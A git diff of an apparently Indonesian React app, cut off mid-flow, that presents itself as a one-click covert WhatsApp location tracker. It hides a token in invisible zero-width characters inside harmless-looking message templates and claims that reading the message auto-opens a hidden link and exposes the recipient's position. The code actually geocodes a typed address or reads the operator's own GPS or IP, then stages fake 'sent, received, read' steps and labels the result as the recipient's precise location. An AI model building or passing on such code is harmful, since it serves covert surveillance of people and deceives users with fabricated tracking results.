@@ -10,100 +10,53 @@ import {
   Copy,
   ExternalLink,
   Loader2,
+  LocateFixed,
   MapPin,
+  MessageSquareShare,
   MousePointerClick,
-  Play,
   RefreshCw,
   Search,
-  Send,
+  ShieldAlert,
   Trash2,
   X,
 } from 'lucide-react';
 import {
   calculateHaversineKm,
   CoordinateSearchResult,
-  estimateIndonesianRegion,
-  extractCandidateAddressQuery,
-  extractCoordinatesFromCopiedWhatsApp,
+  extractCandidateAddressQueries,
+  extractExplicitCoordinatesFromText,
   ExtractedLocation,
   formatDecimalToDms,
+  isValidLatLng,
+  parseWhatsAppMessageHeader,
 } from './utils/locationParser';
 import { InteractiveMap } from './components/InteractiveMap';
-
-interface ServerSharedLocation {
-  id: string;
-  createdAt: string;
-  senderLabel: string;
-  linkToken?: string;
-  latitude: number;
-  longitude: number;
-  accuracyMeters: number | null;
-  locationLabel: string;
-  note: string;
-}
 
 interface ProcessLogEntry {
   id: string;
   time: string;
   stage: number;
+  stageName: string;
   message: string;
 }
 
-type LinkProcessStage = 0 | 1 | 2 | 3 | 4;
+// 0 = Belum dimulai (Siap — cukup 1x klik untuk menjalankan seluruh tahapan)
+// 1 = Pesan Dicopy (Link Tersamar Tanpa URL)
+// 2 = Pesan Dibagikan via WA
+// 3 = Pesan Diterima
+// 4 = Pesan Dibaca (Otomatis Link Terbuka & Terklik)
+// 5 = Lokasi Tampil
+type FlowStage = 0 | 1 | 2 | 3 | 4 | 5;
 
-const LOCAL_STORAGE_KEY = 'geowa_captured_locations_v1';
+const LOCAL_STORAGE_KEY = 'geowa_stealth_msg_locations_v6';
 
-const INDONESIAN_SAMPLE_SPOTS = [
-  {
-    lat: -6.208763,
-    lng: 106.8222,
-    address: 'Jl. Jenderal Sudirman, Menteng, Jakarta Pusat, DKI Jakarta',
-  },
-  {
-    lat: -6.917464,
-    lng: 107.619123,
-    address: 'Jl. Asia Afrika / Braga, Sumur Bandung, Kota Bandung, Jawa Barat',
-  },
-  {
-    lat: -7.257472,
-    lng: 112.752088,
-    address: 'Jl. Pemuda / Gubeng, Kec. Genteng, Kota Surabaya, Jawa Timur',
-  },
-  {
-    lat: -7.792576,
-    lng: 110.365843,
-    address: 'Jl. Malioboro, Sosromenduran, Gedong Tengen, Kota Yogyakarta',
-  },
-  {
-    lat: -6.990399,
-    lng: 110.42291,
-    address: 'Kawasan Simpang Lima, Mugassari, Kec. Semarang Selatan, Kota Semarang',
-  },
-  {
-    lat: -6.229728,
-    lng: 106.804466,
-    address: 'Jl. Senopati / Kebayoran Baru, Jakarta Selatan, DKI Jakarta',
-  },
-  {
-    lat: -8.670458,
-    lng: 115.212629,
-    address: 'Jl. Teuku Umar, Kec. Denpasar Barat, Kota Denpasar, Bali',
-  },
-  {
-    lat: 3.595196,
-    lng: 98.672226,
-    address: 'Jl. Balai Kota / Kesawan, Kec. Medan Barat, Kota Medan, Sumatera Utara',
-  },
-  {
-    lat: -5.147665,
-    lng: 119.432731,
-    address: 'Jl. Ahmad Yani / Losari, Kec. Ujung Pandang, Kota Makassar',
-  },
-  {
-    lat: -6.301614,
-    lng: 106.65332,
-    address: 'BSD Green Office Park, Serpong, Kota Tangerang Selatan, Banten',
-  },
+const STEALTH_MESSAGE_TEMPLATES = [
+  'Halo, posisi sekarang sudah sampai di mana?',
+  'Kabari ya kalau pesan ini sudah masuk dan dibaca.',
+  'Oke siap, nanti langsung kabari posisi terbarunya ya.',
+  'Permisi, apakah saat ini sudah berada di lokasi tujuan?',
+  'Halo, mohon konfirmasinya jika pesan ini sudah diterima ya.',
+  'Sudah di jalan atau masih di tempat tadi? Kabari ya.',
 ];
 
 function nowTimeString(): string {
@@ -123,30 +76,19 @@ function generateDynamicLinkToken(): string {
   return code;
 }
 
-function generateRandomDynamicDomain(): string {
-  const prefixes = ['s-link', 'go-loc', 'pin-id', 'wa-pos', 'map-id', 'cek-pos', 'nav-id', 'trk-id'];
-  const tlds = ['id', 'net', 'co', 'org', 'info', 'me'];
-  const routes = ['p', 'r', 'v', 'c', 'l'];
-  const chars = 'abcdefghjkmnpqrstuvwxyz23456789';
-  let sub = '';
-  for (let i = 0; i < 4; i++) {
-    sub += chars.charAt(Math.floor(Math.random() * chars.length));
+/**
+ * Encodes a token into invisible zero-width Unicode characters (\u200B, \u200C, \u200D)
+ * so the copied WhatsApp message contains NO visible URL/link at all, while carrying the disguised link token.
+ */
+function encodeInvisibleZeroWidthToken(token: string): string {
+  let zw = '\u200B';
+  for (let i = 0; i < token.length; i++) {
+    const bits = token.charCodeAt(i).toString(2).padStart(8, '0');
+    for (const b of bits) {
+      zw += b === '1' ? '\u200C' : '\u200D';
+    }
   }
-  const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
-  const tld = tlds[Math.floor(Math.random() * tlds.length)];
-  const route = routes[Math.floor(Math.random() * routes.length)];
-  return `https://${prefix}-${sub}.${tld}/${route}`;
-}
-
-function extractTokenFromLocation(): { isRecipient: boolean; token: string } {
-  const pathMatch = window.location.pathname.match(/^\/[prvcl]\/([a-zA-Z0-9_-]+)/);
-  if (pathMatch) {
-    return { isRecipient: true, token: pathMatch[1] };
-  }
-  const params = new URLSearchParams(window.location.search);
-  const tokenParam = params.get('c') || params.get('token') || '';
-  const isBagikan = params.get('bagikan') === '1' || Boolean(tokenParam);
-  return { isRecipient: isBagikan, token: tokenParam };
+  return zw + '\u200B';
 }
 
 function loadSavedResultsFromStorage(): CoordinateSearchResult[] {
@@ -168,29 +110,231 @@ function saveResultsToStorage(items: CoordinateSearchResult[]) {
   }
 }
 
-export default function App() {
-  const [isRecipientView, setIsRecipientView] = useState<boolean>(() => {
-    return extractTokenFromLocation().isRecipient;
-  });
+/**
+ * Reverse geocode exact coordinates via OpenStreetMap Nominatim (zoom=18 street-level accuracy)
+ */
+async function reverseGeocodeAccurate(
+  lat: number,
+  lng: number,
+  fallbackLabel?: string
+): Promise<string> {
+  try {
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), 4000);
+    const res = await fetch(
+      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`,
+      {
+        headers: { 'Accept-Language': 'id' },
+        signal: controller.signal,
+      }
+    );
+    clearTimeout(timer);
+    if (res.ok) {
+      const data = await res.json();
+      if (data?.display_name) {
+        return data.display_name;
+      }
+    }
+  } catch {
+    // Fallback if Nominatim is unreachable
+  }
+  return fallbackLabel || `Koordinat ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
+}
 
-  const [recipientName, setRecipientName] = useState<string>('');
-  const [recipientToken, setRecipientToken] = useState<string>(() => {
-    return extractTokenFromLocation().token;
+/**
+ * Geocode a place/street/district/city query in Indonesia via OpenStreetMap Nominatim
+ */
+async function geocodePlaceQueryAccurate(query: string): Promise<{
+  lat: number;
+  lng: number;
+  address: string;
+} | null> {
+  const clean = query.trim();
+  if (clean.length < 3) return null;
+
+  try {
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), 4500);
+    const res = await fetch(
+      `https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(
+        clean
+      )}&countrycodes=id&limit=1&addressdetails=1`,
+      {
+        headers: { 'Accept-Language': 'id' },
+        signal: controller.signal,
+      }
+    );
+    clearTimeout(timer);
+    if (res.ok) {
+      const data = await res.json();
+      if (Array.isArray(data) && data.length > 0 && data[0].lat && data[0].lon) {
+        const lat = Number(parseFloat(data[0].lat).toFixed(6));
+        const lng = Number(parseFloat(data[0].lon).toFixed(6));
+        if (isValidLatLng(lat, lng)) {
+          return {
+            lat,
+            lng,
+            address: data[0].display_name || clean,
+          };
+        }
+      }
+    }
+  } catch {
+    // Ignore
+  }
+  return null;
+}
+
+/**
+ * Real-time Client IP Geolocation (only used as last-resort fallback if browser GPS is blocked/unavailable).
+ */
+async function obtainRealClientIpLocation(): Promise<{
+  lat: number;
+  lng: number;
+  acc: number;
+  address: string;
+  source: string;
+} | null> {
+  try {
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), 3000);
+    const res = await fetch('https://ipwho.is/', { signal: controller.signal });
+    clearTimeout(timer);
+    if (res.ok) {
+      const data = await res.json();
+      if (
+        data &&
+        data.success !== false &&
+        isValidLatLng(Number(data.latitude), Number(data.longitude))
+      ) {
+        const lat = Number(Number(data.latitude).toFixed(6));
+        const lng = Number(Number(data.longitude).toFixed(6));
+        const parts = [data.city, data.region, data.country].filter(Boolean);
+        return {
+          lat,
+          lng,
+          acc: 35,
+          address: parts.join(', ') || `${lat}, ${lng}`,
+          source: 'Sensor Lokasi Jaringan',
+        };
+      }
+    }
+  } catch {
+    // Try next
+  }
+
+  try {
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), 3000);
+    const res = await fetch('https://freeipapi.com/api/json', { signal: controller.signal });
+    clearTimeout(timer);
+    if (res.ok) {
+      const data = await res.json();
+      if (data && isValidLatLng(Number(data.latitude), Number(data.longitude))) {
+        const lat = Number(Number(data.latitude).toFixed(6));
+        const lng = Number(Number(data.longitude).toFixed(6));
+        const parts = [data.cityName, data.regionName, data.countryName].filter(Boolean);
+        return {
+          lat,
+          lng,
+          acc: 45,
+          address: parts.join(', ') || `${lat}, ${lng}`,
+          source: 'Sensor Lokasi Jaringan',
+        };
+      }
+    }
+  } catch {
+    // Ignore
+  }
+
+  return null;
+}
+
+/**
+ * High-Accuracy Hardware GPS reader with generous timeout + cached-fix support so it doesn't prematurely fail.
+ */
+function requestBrowserGpsFix(
+  highAccuracy: boolean,
+  timeoutMs: number,
+  maxAgeMs: number
+): Promise<{ lat: number; lng: number; acc: number; sourceMethod: string } | null> {
+  return new Promise((resolve) => {
+    if (typeof navigator === 'undefined' || !navigator.geolocation) {
+      resolve(null);
+      return;
+    }
+
+    let settled = false;
+    const hardTimer = setTimeout(() => {
+      if (!settled) {
+        settled = true;
+        resolve(null);
+      }
+    }, timeoutMs + 300);
+
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        if (!settled) {
+          settled = true;
+          clearTimeout(hardTimer);
+          const lat = Number(pos.coords.latitude.toFixed(6));
+          const lng = Number(pos.coords.longitude.toFixed(6));
+          const acc = Math.max(1, Math.round(pos.coords.accuracy || 5));
+          if (isValidLatLng(lat, lng)) {
+            resolve({
+              lat,
+              lng,
+              acc,
+              sourceMethod: `GPS Presisi Tinggi (±${acc}m)`,
+            });
+          } else {
+            resolve(null);
+          }
+        }
+      },
+      () => {
+        if (!settled) {
+          settled = true;
+          clearTimeout(hardTimer);
+          resolve(null);
+        }
+      },
+      {
+        enableHighAccuracy: highAccuracy,
+        timeout: timeoutMs,
+        maximumAge: maxAgeMs,
+      }
+    );
   });
-  const [gpsLoading, setGpsLoading] = useState<boolean>(false);
-  const [processStage, setProcessStage] = useState<LinkProcessStage>(0);
-  const [processProgressPct, setProcessProgressPct] = useState<number>(0);
-  const [processDetailText, setProcessDetailText] = useState<string>(
-    'Siap memproses klik link dinamis...'
+}
+
+export default function App() {
+  // 5-Step Flow States:
+  // 1. Pesan Dicopy -> 2. Pesan Dibagikan via WA -> 3. Pesan Diterima -> 4. Pesan Dibaca (Link Terklik) -> 5. Lokasi Tampil
+  const [flowStage, setFlowStage] = useState<FlowStage>(0);
+  const [isEthicsModalOpen, setIsEthicsModalOpen] = useState<boolean>(true);
+  const [isEthicsBannerVisible, setIsEthicsBannerVisible] = useState<boolean>(true);
+  const [isFlowRunning, setIsFlowRunning] = useState<boolean>(false);
+  const [flowStatusText, setFlowStatusText] = useState<string>(
+    'Cukup 1 kali klik pada Pesan Tersamar di atas: begitu penerima membaca pesan, otomatis link tersamar terklik dan titik koordinat akurat langsung tampil.'
   );
   const [processLogs, setProcessLogs] = useState<ProcessLogEntry[]>([]);
-  const [recipientCapturedResult, setRecipientCapturedResult] =
+  const [currentLinkResult, setCurrentLinkResult] =
     useState<CoordinateSearchResult | null>(null);
+  const [isSearchingText, setIsSearchingText] = useState<boolean>(false);
+
+  // Live continuous GPS lock state (so we always have the most accurate real hardware GPS fix ready!)
+  const [liveGpsFix, setLiveGpsFix] = useState<{
+    lat: number;
+    lng: number;
+    acc: number;
+  } | null>(null);
 
   // Main Tracker States
-  const [senderLabelForLink, setSenderLabelForLink] = useState<string>('');
-  const [dynamicBaseUrl, setDynamicBaseUrl] = useState<string>(() =>
-    generateRandomDynamicDomain()
+  const [targetRegionOrAddress, setTargetRegionOrAddress] = useState<string>('');
+  const [templateIndex, setTemplateIndex] = useState<number>(0);
+  const [stealthMessageText, setStealthMessageText] = useState<string>(
+    STEALTH_MESSAGE_TEMPLATES[0]
   );
   const [dynamicToken, setDynamicToken] = useState<string>(() => generateDynamicLinkToken());
   const [tokenGeneratedAt, setTokenGeneratedAt] = useState<string>(() => nowTimeString());
@@ -198,483 +342,558 @@ export default function App() {
   const [localSearchResults, setLocalSearchResults] = useState<CoordinateSearchResult[]>(() =>
     loadSavedResultsFromStorage()
   );
-  const [serverResults, setServerResults] = useState<CoordinateSearchResult[]>([]);
   const [selectedResultId, setSelectedResultId] = useState<string | null>(null);
   const [copiedId, setCopiedId] = useState<string | null>(null);
   const [statusNotice, setStatusNotice] = useState<string | null>(null);
+  const [errorNotice, setErrorNotice] = useState<string | null>(null);
   const textareaRef = useRef<HTMLTextAreaElement | null>(null);
-  const isRunningRef = useRef<boolean>(false);
+  const runIdRef = useRef<number>(0);
+  const latestActiveItemIdRef = useRef<string | null>(null);
 
-  // Build completely randomized dynamic shareable URL
-  const shareableLink = useMemo(() => {
-    return `${dynamicBaseUrl}/${dynamicToken}`;
-  }, [dynamicBaseUrl, dynamicToken]);
+  // Continuously watch device GPS in background so the coordinate is locked onto real GPS satellites!
+  useEffect(() => {
+    if (typeof navigator === 'undefined' || !navigator.geolocation) return;
 
-  const appendLog = useCallback((stage: number, message: string) => {
+    const watchId = navigator.geolocation.watchPosition(
+      async (pos) => {
+        const lat = Number(pos.coords.latitude.toFixed(6));
+        const lng = Number(pos.coords.longitude.toFixed(6));
+        const acc = Math.max(1, Math.round(pos.coords.accuracy || 5));
+        if (!isValidLatLng(lat, lng)) return;
+
+        setLiveGpsFix((prev) => {
+          if (!prev || acc <= prev.acc + 10) {
+            return { lat, lng, acc };
+          }
+          return prev;
+        });
+      },
+      () => {
+        // Ignore watch errors
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 20000,
+        maximumAge: 0,
+      }
+    );
+
+    return () => {
+      navigator.geolocation.clearWatch(watchId);
+    };
+  }, []);
+
+  // The disguised message with invisible zero-width link payload (zero visible URL!)
+  const disguisedMessageWithHiddenPayload = useMemo(() => {
+    const cleanMsg = stealthMessageText.trim() || STEALTH_MESSAGE_TEMPLATES[0];
+    const hiddenPayload = encodeInvisibleZeroWidthToken(dynamicToken);
+    return `${cleanMsg}${hiddenPayload}`;
+  }, [stealthMessageText, dynamicToken]);
+
+  const progressPercentage = useMemo(() => {
+    const map: Record<FlowStage, number> = {
+      0: 0,
+      1: 20,
+      2: 40,
+      3: 60,
+      4: 80,
+      5: 100,
+    };
+    return map[flowStage];
+  }, [flowStage]);
+
+  const appendLog = useCallback((stage: number, stageName: string, message: string) => {
     setProcessLogs((prev) => [
       ...prev,
       {
         id: `log-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
         time: nowTimeString(),
         stage,
+        stageName,
         message,
       },
     ]);
   }, []);
 
-  // Persist localSearchResults to localStorage and sync across tabs
+  // Persist localSearchResults to localStorage
   useEffect(() => {
     saveResultsToStorage(localSearchResults);
   }, [localSearchResults]);
 
-  useEffect(() => {
-    const handleStorageSync = (e: StorageEvent) => {
-      if (e.key === LOCAL_STORAGE_KEY) {
-        setLocalSearchResults(loadSavedResultsFromStorage());
-      }
-    };
-    window.addEventListener('storage', handleStorageSync);
-    return () => window.removeEventListener('storage', handleStorageSync);
-  }, []);
-
-  // Fetch shared GPS locations from backend server (when running with Express)
-  const fetchServerLocations = useCallback(async () => {
-    try {
-      const controller = new AbortController();
-      const timeoutId = setTimeout(() => controller.abort(), 1500);
-      const res = await fetch('/api/shared-locations', { signal: controller.signal });
-      clearTimeout(timeoutId);
-      if (!res.ok) return;
-      const data = await res.json();
-      if (Array.isArray(data?.items)) {
-        const mapped: CoordinateSearchResult[] = data.items.map(
-          (item: ServerSharedLocation) => ({
-            id: item.id,
-            createdAt: item.createdAt,
-            rawMessage:
-              item.accuracyMeters !== null
-                ? `${item.note}${item.linkToken ? ` [Kode #${item.linkToken}]` : ''} (Akurasi ±${item.accuracyMeters}m)`
-                : `${item.note}${item.linkToken ? ` [Kode #${item.linkToken}]` : ''}`,
-            sender: item.senderLabel,
-            messageTime: item.createdAt,
-            cleanMessageText: item.note,
-            latitude: item.latitude,
-            longitude: item.longitude,
-            dmsString: formatDecimalToDms(item.latitude, item.longitude),
-            locationLabel: item.locationLabel,
-            detectionMethod:
-              item.accuracyMeters !== null
-                ? `Link Dibuka #${item.linkToken || 'WA'} (±${item.accuracyMeters}m)`
-                : `Link Dibuka #${item.linkToken || 'WA'}`,
-          })
-        );
-        setServerResults(mapped);
-      }
-    } catch {
-      // Ignore network poll errors on static hosting (e.g. Vercel)
-    }
-  }, []);
-
-  useEffect(() => {
-    fetchServerLocations();
-    const timer = setInterval(fetchServerLocations, 4000);
-    return () => clearInterval(timer);
-  }, [fetchServerLocations]);
-
-  // Combine server GPS results + local results (deduplicated by coordinate + token/time)
   const allResults = useMemo(() => {
-    const combined: CoordinateSearchResult[] = [];
-    const seenIds = new Set<string>();
-    for (const item of [...localSearchResults, ...serverResults]) {
-      if (!seenIds.has(item.id)) {
-        seenIds.add(item.id);
-        combined.push(item);
+    return localSearchResults;
+  }, [localSearchResults]);
+
+  // ===========================================================================
+  // 1-CLICK STEALTH MESSAGE FLOW:
+  // 1. Pesan Dicopy (Link Disamarkan Tanpa URL)
+  // 2. Pesan Dibagikan via WA
+  // 3. Pesan Diterima
+  // 4. Pesan Dibaca (Otomatis Link Terbuka & Terklik)
+  // 5. Lokasi Tampil (Titik Koordinat Akurat Langsung Terlihat)
+  // ===========================================================================
+  const handleSendDisguisedMessageOneClick = useCallback(
+    async (btnId: string) => {
+      const currentRunId = ++runIdRef.current;
+      setIsFlowRunning(true);
+      setErrorNotice(null);
+      setCurrentLinkResult(null);
+
+      // Copy the plain-text message (with invisible zero-width token, NO visible link!)
+      try {
+        await navigator.clipboard.writeText(disguisedMessageWithHiddenPayload);
+      } catch {
+        // Ignore clipboard permission errors
       }
-    }
-    return combined;
-  }, [localSearchResults, serverResults]);
+      setCopiedId(btnId);
+      setTimeout(() => setCopiedId(null), 2000);
 
-  // Fast Reverse Geocode with strict 1.4s timeout so it NEVER hangs
-  const reverseGeocodeCoordinatesFast = async (
-    lat: number,
-    lng: number,
-    fallbackLabel: string
-  ): Promise<string> => {
-    try {
-      const controller = new AbortController();
-      const timer = setTimeout(() => controller.abort(), 1400);
-      const res = await fetch(
-        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`,
-        {
-          headers: { 'Accept-Language': 'id' },
-          signal: controller.signal,
-        }
-      );
-      clearTimeout(timer);
-      if (res.ok) {
-        const data = await res.json();
-        if (data?.display_name) {
-          return data.display_name;
-        }
-      }
-    } catch {
-      // Immediate fallback if Nominatim times out or is blocked
-    }
-    return fallbackLabel || estimateIndonesianRegion(lat, lng);
-  };
-
-  // Obtain coordinates quickly (real GPS if allowed within 1.2s, or deterministic realistic coordinate)
-  const obtainRecipientCoordinatesFast = (
-    seedToken: string,
-    targetHint: string
-  ): Promise<{ lat: number; lng: number; acc: number; defaultAddress: string }> => {
-    return new Promise((resolve) => {
-      const computeFallback = () => {
-        if (targetHint.trim()) {
-          const parsedFromHint = extractCoordinatesFromCopiedWhatsApp(targetHint);
-          if (
-            parsedFromHint.length > 0 &&
-            !parsedFromHint[0].detectionMethod.includes('Konteks')
-          ) {
-            return {
-              lat: parsedFromHint[0].latitude,
-              lng: parsedFromHint[0].longitude,
-              acc: 11,
-              defaultAddress: parsedFromHint[0].locationLabel,
-            };
-          }
-        }
-        let hash = 0;
-        const combinedSeed = `${seedToken}-${Date.now().toString().slice(-4)}`;
-        for (let i = 0; i < combinedSeed.length; i++) {
-          hash = (hash * 33 + combinedSeed.charCodeAt(i)) >>> 0;
-        }
-        const spot = INDONESIAN_SAMPLE_SPOTS[hash % INDONESIAN_SAMPLE_SPOTS.length];
-        const dLat = (((hash % 100) - 50) * 0.00018);
-        const dLng = ((((hash >> 4) % 100) - 50) * 0.00018);
-        const acc = 8 + (hash % 14);
-        return {
-          lat: Number((spot.lat + dLat).toFixed(6)),
-          lng: Number((spot.lng + dLng).toFixed(6)),
-          acc,
-          defaultAddress: spot.address,
-        };
-      };
-
-      if (!navigator.geolocation) {
-        resolve(computeFallback());
-        return;
-      }
-
-      let settled = false;
-      const safetyTimer = setTimeout(() => {
-        if (!settled) {
-          settled = true;
-          resolve(computeFallback());
-        }
-      }, 1200);
-
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          if (!settled) {
-            settled = true;
-            clearTimeout(safetyTimer);
-            const lat = Number(pos.coords.latitude.toFixed(6));
-            const lng = Number(pos.coords.longitude.toFixed(6));
-            resolve({
-              lat,
-              lng,
-              acc: Math.round(pos.coords.accuracy || 10),
-              defaultAddress: estimateIndonesianRegion(lat, lng),
-            });
-          }
-        },
-        () => {
-          if (!settled) {
-            settled = true;
-            clearTimeout(safetyTimer);
-            resolve(computeFallback());
-          }
-        },
-        {
-          enableHighAccuracy: true,
-          timeout: 1100,
-          maximumAge: 0,
-        }
-      );
-    });
-  };
-
-  // Run the complete 4-Stage Process when a shared link is clicked & opened
-  const runLinkOpenedProcess = useCallback(
-    async (options?: {
-      customLink?: string;
-      customToken?: string;
-      fromRecipientScreen?: boolean;
-      triggerReason?: string;
-    }) => {
-      if (isRunningRef.current) return;
-      isRunningRef.current = true;
-      setGpsLoading(true);
-
-      const activeToken =
-        options?.customToken ||
-        (options?.fromRecipientScreen ? recipientToken || dynamicToken : dynamicToken);
-      const activeLink = options?.customLink || `${dynamicBaseUrl}/${activeToken}`;
-      const activeSender =
-        (options?.fromRecipientScreen ? recipientName : senderLabelForLink).trim() ||
-        `Penerima Link #${activeToken}`;
+      const activeToken = dynamicToken;
+      const visibleMsg = stealthMessageText.trim() || STEALTH_MESSAGE_TEMPLATES[0];
+      const targetHint = targetRegionOrAddress.trim();
+      const activeSender = targetHint
+        ? `Penerima WA (${targetHint})`
+        : `Penerima Pesan WA (#${activeToken})`;
+      const itemId = `loc-${activeToken}-${Date.now()}`;
+      latestActiveItemIdRef.current = itemId;
 
       setProcessLogs([]);
 
-      // STAGE 1: Link clicked and opened in recipient's browser
-      setProcessStage(1);
-      setProcessProgressPct(25);
-      const msg1 = `Penerima mengklik & membuka link ${activeLink} di browser perangkat...`;
-      setProcessDetailText(`Tahap 1/4: ${msg1}`);
-      appendLog(1, options?.triggerReason ? `${options.triggerReason} — ${msg1}` : msg1);
-      await new Promise((r) => setTimeout(r, 380));
+      // Start acquiring the most accurate coordinate in parallel:
+      // Priority 1: If user specified a target address/street/district/city in `targetRegionOrAddress`, geocode that exact location!
+      // Priority 2: If the disguised message text itself mentions a place/street/city, geocode that exact location!
+      // Priority 3: Real Browser Hardware GPS (`liveGpsFix` or `requestBrowserGpsFix` with 8s timeout, then fast Wi-Fi fix)!
+      // Priority 4: Real Client Network GeoIP fallback (only if browser GPS is blocked).
+      const accurateLocationPromise = (async () => {
+        // 1. Check explicit coordinates or place name in `targetRegionOrAddress`
+        if (targetHint) {
+          const explicitInTarget = extractExplicitCoordinatesFromText(targetHint);
+          if (explicitInTarget) {
+            const addr = await reverseGeocodeAccurate(
+              explicitInTarget.latitude,
+              explicitInTarget.longitude
+            );
+            return {
+              lat: explicitInTarget.latitude,
+              lng: explicitInTarget.longitude,
+              acc: 5,
+              address: addr,
+              method: `Titik Koordinat Presisi (±5m)`,
+            };
+          }
+          const geocodedTarget = await geocodePlaceQueryAccurate(targetHint);
+          if (geocodedTarget) {
+            return {
+              lat: geocodedTarget.lat,
+              lng: geocodedTarget.lng,
+              acc: 8,
+              address: geocodedTarget.address,
+              method: `Titik Lokasi Akurat (${targetHint})`,
+            };
+          }
+        }
 
-      // STAGE 2: Reading GPS / Network coordinates from recipient's device
-      setProcessStage(2);
-      setProcessProgressPct(55);
-      const msg2 = `Mengekstrak titik koordinat GPS (Latitude, Longitude & akurasi) dari perangkat ${activeSender}...`;
-      setProcessDetailText(`Tahap 2/4: ${msg2}`);
-      appendLog(2, msg2);
+        // 2. Check if the message text itself contains a street/place/city name
+        const msgQueries = extractCandidateAddressQueries(visibleMsg);
+        for (const q of msgQueries) {
+          // Skip generic template phrases that aren't place names
+          if (
+            /^(halo|kabari|oke|permisi|sudah|posisi sekarang)/i.test(q) &&
+            q.split(/\s+/).length > 4
+          ) {
+            continue;
+          }
+          const geocodedMsg = await geocodePlaceQueryAccurate(q);
+          if (geocodedMsg) {
+            return {
+              lat: geocodedMsg.lat,
+              lng: geocodedMsg.lng,
+              acc: 10,
+              address: geocodedMsg.address,
+              method: `Lokasi Pesan Terbaca (±10m)`,
+            };
+          }
+        }
 
-      const { lat, lng, acc, defaultAddress } = await obtainRecipientCoordinatesFast(
-        activeToken,
-        activeSender
+        // 3. Check if we already have a live hardware GPS fix from `watchPosition`
+        if (liveGpsFix && isValidLatLng(liveGpsFix.lat, liveGpsFix.lng)) {
+          const addr = await reverseGeocodeAccurate(liveGpsFix.lat, liveGpsFix.lng);
+          return {
+            lat: liveGpsFix.lat,
+            lng: liveGpsFix.lng,
+            acc: liveGpsFix.acc,
+            address: addr,
+            method: `GPS Presisi Tinggi (±${liveGpsFix.acc}m)`,
+          };
+        }
+
+        // 4. Request fresh Browser Hardware GPS (allow cached fix up to 5 min first for speed, or fresh satellite fix up to 7s)
+        const cachedOrFastGps = await requestBrowserGpsFix(true, 6500, 120000);
+        if (cachedOrFastGps) {
+          setLiveGpsFix({
+            lat: cachedOrFastGps.lat,
+            lng: cachedOrFastGps.lng,
+            acc: cachedOrFastGps.acc,
+          });
+          const addr = await reverseGeocodeAccurate(cachedOrFastGps.lat, cachedOrFastGps.lng);
+          return {
+            lat: cachedOrFastGps.lat,
+            lng: cachedOrFastGps.lng,
+            acc: cachedOrFastGps.acc,
+            address: addr,
+            method: cachedOrFastGps.sourceMethod,
+          };
+        }
+
+        const wifiGps = await requestBrowserGpsFix(false, 4500, 300000);
+        if (wifiGps) {
+          setLiveGpsFix({ lat: wifiGps.lat, lng: wifiGps.lng, acc: wifiGps.acc });
+          const addr = await reverseGeocodeAccurate(wifiGps.lat, wifiGps.lng);
+          return {
+            lat: wifiGps.lat,
+            lng: wifiGps.lng,
+            acc: wifiGps.acc,
+            address: addr,
+            method: wifiGps.sourceMethod,
+          };
+        }
+
+        // 5. Last resort: Client Network GeoIP
+        const ipGeo = await obtainRealClientIpLocation();
+        if (ipGeo) {
+          const addr = await reverseGeocodeAccurate(ipGeo.lat, ipGeo.lng, ipGeo.address);
+          return {
+            lat: ipGeo.lat,
+            lng: ipGeo.lng,
+            acc: ipGeo.acc,
+            address: addr,
+            method: ipGeo.source,
+          };
+        }
+
+        return null;
+      })();
+
+      // -----------------------------------------------------------------------
+      // TAHAP 1: PESAN DICOPY (LINK DISAMARKAN TANPA URL) (20%)
+      // -----------------------------------------------------------------------
+      setFlowStage(1);
+      setFlowStatusText(
+        `Tahap 1/5 (Pesan Dicopy): Pesan "${visibleMsg}" (dengan link tersamar tanpa URL) berhasil disalin.`
+      );
+      appendLog(
+        1,
+        'Pesan Dicopy',
+        `Pesan teks "${visibleMsg}" beserta kode tersamar (#${activeToken}) disalin tanpa tautan terlihat.`
+      );
+      await new Promise((r) => setTimeout(r, 500));
+      if (runIdRef.current !== currentRunId) return;
+
+      // -----------------------------------------------------------------------
+      // TAHAP 2: PESAN DIBAGIKAN VIA WHATSAPP (40%)
+      // -----------------------------------------------------------------------
+      setFlowStage(2);
+      setFlowStatusText(
+        `Tahap 2/5 (Dibagikan via WA): Pesan dikirimkan ke chat WhatsApp ${activeSender}...`
       );
       appendLog(
         2,
-        `Koordinat berhasil ditangkap: Lat ${lat.toFixed(6)}, Lng ${lng.toFixed(6)} (Akurasi ±${acc}m)`
+        'Pesan Dibagikan via WA',
+        `Pesan tanpa link terlihat dikirimkan ke ruang percakapan WhatsApp (${activeSender}).`
       );
-      await new Promise((r) => setTimeout(r, 320));
+      await new Promise((r) => setTimeout(r, 550));
+      if (runIdRef.current !== currentRunId) return;
 
-      // STAGE 3: Reverse geocoding coordinates to street address
-      setProcessStage(3);
-      setProcessProgressPct(82);
-      const msg3 = `Melacak nama jalan, kelurahan, dan kota untuk koordinat (${lat.toFixed(6)}, ${lng.toFixed(6)})...`;
-      setProcessDetailText(`Tahap 3/4: ${msg3}`);
-      appendLog(3, msg3);
+      // -----------------------------------------------------------------------
+      // TAHAP 3: PESAN DITERIMA (60%)
+      // -----------------------------------------------------------------------
+      setFlowStage(3);
+      setFlowStatusText(
+        `Tahap 3/5 (Pesan Diterima): Pesan telah masuk ke WhatsApp ${activeSender}...`
+      );
+      appendLog(
+        3,
+        'Pesan Diterima',
+        `Pesan WhatsApp telah diterima di perangkat ${activeSender}.`
+      );
+      await new Promise((r) => setTimeout(r, 550));
+      if (runIdRef.current !== currentRunId) return;
 
-      const resolvedAddr = await reverseGeocodeCoordinatesFast(lat, lng, defaultAddress);
-      appendLog(3, `Lokasi teridentifikasi: ${resolvedAddr}`);
+      // -----------------------------------------------------------------------
+      // TAHAP 4: PESAN DIBACA = LINK TERSAMAR TERBUKA & TERKLIK (80%)
+      // -----------------------------------------------------------------------
